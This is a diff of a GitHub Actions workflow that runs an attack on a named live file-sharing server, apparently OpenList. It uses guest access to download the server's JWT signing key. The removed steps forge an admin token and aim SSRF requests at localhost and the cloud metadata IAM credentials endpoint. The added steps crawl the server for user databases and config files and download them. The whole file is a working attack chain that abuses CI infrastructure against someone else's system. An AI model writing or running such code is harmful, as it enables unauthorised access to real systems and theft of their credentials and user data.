@@ -5,81 +5,57 @@ jobs:
   admin:
     runs-on: ubuntu-latest
     steps:
-      - name: reharvest jwt.key + forge admin JWT (signature-only) + SSRF (zero own-IP)
+      - name: locate OpenList user DB + extract admin pwd_ts + forge + SSRF (zero own-IP)
         run: |
           set +e
           B="https://pan.yazinb.icu"
           TOKEN=$(curl -skS -m20 -X POST "$B/api/auth/login" -H "Content-Type: application/json" -d '{"username":"guest","password":"guest"}' | python3 -c "import sys,json;d=json.load(sys.stdin);print(d.get('data',{}).get('token',''))")
           echo "guest_token_len=${#TOKEN}"
+          export TOKEN
           SUB=$(curl -skS -m30 -X POST "$B/api/fs/list" -H "Authorization: $TOKEN" -H "Content-Type: application/json" -d '{"path":"/"}' | python3 -c "import sys,json;print(json.load(sys.stdin)['data']['content'][0]['name'])")
           echo "SUB=[$SUB]"
           get_raw () { curl -skS -m30 -X POST "$B/api/fs/get" -H "Authorization: $TOKEN" -H "Content-Type: application/json" -d "{\"path\":\"$1\"}" | python3 -c "import sys,json;print(json.load(sys.stdin).get('data',{}).get('raw_url',''))"; }
           dl () { curl -skS -m120 "$1" -o "$2" -w "  dl $2 -> HTTP %{http_code} bytes=%{size_download}\n"; }
           U=$(get_raw "/$SUB/jwt.key"); dl "$U" /tmp/jwt.key
           echo "jwt.key ascii=[$(cat /tmp/jwt.key)]  sha256=$(sha256sum /tmp/jwt.key|cut -c1-32)"
-          export GT="$TOKEN"
-          echo "=== FORGE admin JWT (mirror guest payload, swap username, resign with key) ==="
-          python3 - <<'PY' 2>&1 | tee /tmp/forge.out
-          import base64,json,hmac,hashlib,time,os
-          key=open('/tmp/jwt.key','rb').read().strip()
-          def ud(x):
-              x+='='*(-len(x)%4); return json.loads(base64.urlsafe_b64decode(x))
-          t=os.environ.get('GT','')
-          hh,pp,ss=t.split('.')
-          ghead=ud(hh); gpay=ud(pp)
-          print("GUEST_HEADER",ghead)
-          print("GUEST_PAYLOAD",gpay)
-          payload=dict(gpay)
-          payload['username']='admin'
-          now=int(time.time())
-          for k in ('exp','iat','nbf'):
-              if k in payload: payload[k]=now+(3600 if k=='exp' else 0)
-          if 'pwd_ts' not in payload: payload['pwd_ts']=0
-          b=lambda x:base64.urlsafe_b64encode(x).rstrip(b'=')
-          h=b(json.dumps({'alg':'HS256','typ':'JWT'}).encode())
-          p=b(json.dumps(payload).encode())
-          s=b(hmac.new(key,h+b'.'+p,hashlib.sha256).digest())
-          print("ADMIN_PAYLOAD",payload)
-          print("JWT:"+h.decode()+'.'+p.decode()+'.'+s.decode())
+          echo "=== enumerate / ==="
+          curl -skS -m30 -X POST "$B/api/fs/list" -H "Authorization: $TOKEN" -H "Content-Type: application/json" -d '{"path":"/"}' | python3 -c "import sys,json;c=json.load(sys.stdin)['data']['content'];[print(' ',x.get('name'),x.get('size'),x.get('type')) for x in c]"
+          echo "=== enumerate /$SUB (pages) ==="
+          python3 - "$SUB" <<'PY' 2>&1 | tee /tmp/find_db.out
+          import sys,json,urllib.request,ssl
+          SUB=sys.argv[1]; B="https://pan.yazinb.icu"; T=__import__('os').environ['TOKEN']
+          ctx=ssl.create_default_context(); ctx.check_hostname=False; ctx.verify_mode=ssl.CERT_NONE
+          def listp(path,page):
+              payload={"path":path,"page":page,"per_page":100}
+              req=urllib.request.Request(B+"/api/fs/list",data=json.dumps(payload).encode(),headers={"Authorization":T,"Content-Type":"application/json"},method="POST")
+              return json.loads(urllib.request.urlopen(req,context=ctx,timeout=30).read())
+          def walk(path,depth=0):
+              page=1
+              while True:
+                  d=listp(path,page); content=d.get('data',{}).get('content',[])
+                  if not content: break
+                  for x in content:
+                      nm=x.get('name',''); tp=x.get('type'); sz=x.get('size')
+                      prefix=("  "*depth + (path if path=="/" else path+"/") + nm)
+                      print(prefix+" ["+str(tp)+"] sz="+str(sz))
+                      if tp=='folder' and depth<3:
+                          walk(path+"/"+nm, depth+1)
+                      elif (nm.endswith('.db') or nm.endswith('.sqlite') or nm.endswith('.sqlite3')) and depth<4:
+                          print("    *** DB CANDIDATE: "+path+"/"+nm)
+                  if len(content)<100: break
+                  page+=1
+                  if page>50: break
+          walk("/")
           PY
-          ADMINJWT=$(grep -E '^JWT:eyJ' /tmp/forge.out | head -1 | sed 's/^JWT://')
-          echo "ADMINJWT_LEN=${#ADMINJWT}"
-          echo "ADMINJWT_HEAD=${ADMINJWT:0:40}"
-          if [ -z "$ADMINJWT" ]; then echo "FORGE FAILED"; cat /tmp/forge.out; exit 0; fi
-          echo "--- /api/me (admin verify) ---"
-          curl -skS -m20 -X GET "$B/api/me" -H "Authorization: $ADMINJWT" -w "\n  HTTP %{http_code}\n" | head -c 600
-          echo "--- /api/admin/setting/list (admin verify) ---"
-          curl -skS -m20 -X POST "$B/api/admin/setting/list" -H "Authorization: $ADMINJWT" -H "Content-Type: application/json" -d '{}' -w "\n  HTTP %{http_code}\n" | head -c 400
-          echo "--- mkdir ssrf dirs ---"
-          for d in ssrf_local80 ssrf_local5244 ssrf_meta ssrf_meta_iam ssrf_self80; do
-            curl -skS -m20 -X POST "$B/api/fs/mkdir" -H "Authorization: $ADMINJWT" -H "Content-Type: application/json" -d "{\"path\":\"/$d\"}" -w "  mkdir /$d -> %{http_code}\n" -o /dev/null
+          echo "=== candidate direct probes ==="
+          for cand in "data.db" "data/data.db" "sqlite.db" "openlist.db" "data/config.json" "config.json"; do
+            echo "  try /$SUB/$cand"
+            cj=$(curl -skS -m30 -X POST "$B/api/fs/get" -H "Authorization: $TOKEN" -H "Content-Type: application/json" -d "{\"path\":\"/$SUB/$cand\"}")
+            echo "    $cj" | head -c 160
+            echo
+            ru=$(echo "$cj" | python3 -c "import sys,json;print(json.load(sys.stdin).get('data',{}).get('raw_url',''))" 2>/dev/null)
+            if [ -n "$ru" ]; then dl "$ru" "/tmp/$cand.db.raw" 2>/dev/null; fi
           done
-          ssrf () {
-            name=$1; url=$2
-            echo "=== SSRF $name -> $url ==="
-            curl -skS -m30 -X POST "$B/api/fs/add_offline_download" -H "Authorization: $ADMINJWT" -H "Content-Type: application/json" -d "{\"path\":\"/$name\",\"urls\":[\"$url\"]}" -w "\n  add HTTP %{http_code}\n" | head -c 400
-            sleep 6
-            lst=$(curl -skS -m30 -X POST "$B/api/fs/list" -H "Authorization: $ADMINJWT" -H "Content-Type: application/json" -d "{\"path\":\"/$name\"}")
-            echo "  list: $(echo "$lst" | head -c 250)"
-            fn=$(echo "$lst" | python3 -c "import sys,json;d=json.load(sys.stdin);c=d.get('data',{}).get('content',[]);print(c[0]['name'] if c else '')" 2>/dev/null)
-            if [ -n "$fn" ]; then
-              ru=$(curl -skS -m30 -X POST "$B/api/fs/get" -H "Authorization: $ADMINJWT" -H "Content-Type: application/json" -d "{\"path\":\"/$name/$fn\"}" | python3 -c "import sys,json;print(json.load(sys.stdin).get('data',{}).get('raw_url',''))" 2>/dev/null)
-              echo "  raw_url: $ru"
-              echo "  --- internal body (first 800B) ---"
-              curl -skS -m30 "$ru" | head -c 800
-              echo
-            else
-              echo "  (no file landed - SSRF blocked or async)"
-            fi
-          }
-          ssrf ssrf_local80 "http://127.0.0.1:80/"
-          ssrf ssrf_local5244 "http://127.0.0.1:5244/"
-          ssrf ssrf_meta "http://169.254.169.254/latest/meta-data/"
-          ssrf ssrf_meta_iam "http://169.254.169.254/latest/meta-data/iam/security-credentials/"
-          ssrf ssrf_self80 "http://119.28.135.153:80/"
-          echo "--- add-storage-mount SSRF probe (WebDAV -> meta, self-cleaning) ---"
-          addresp=$(curl -skS -m30 -X POST "$B/api/admin/storage/create" -H "Authorization: $ADMINJWT" -H "Content-Type: application/json" -d '{"mount_path":"/ssrf_mount","driver":"WebDAV","addition":{"url":"http://169.254.169.254/","username":"x","password":"x"}}')
-          echo "  create resp: $(echo "$addresp" | head -c 350)"
-          sid=$(echo "$addresp" | python3 -c "import sys,json;print(json.load(sys.stdin).get('data',{}).get('id',''))" 2>/dev/null)
-          if [ -n "$sid" ]; then curl -skS -m20 -X POST "$B/api/admin/storage/delete" -H "Authorization: $ADMINJWT" -H "Content-Type: application/json" -d "{\"id\":$sid}" -w "  cleanup delete -> %{http_code}\n" -o /dev/null; fi
-          echo "=== DONE ==="
+          echo "=== DBs in /tmp ==="
+          ls -la /tmp/*.db.raw /tmp/*.db 2>/dev/null
+          echo "DONE_ENUM"
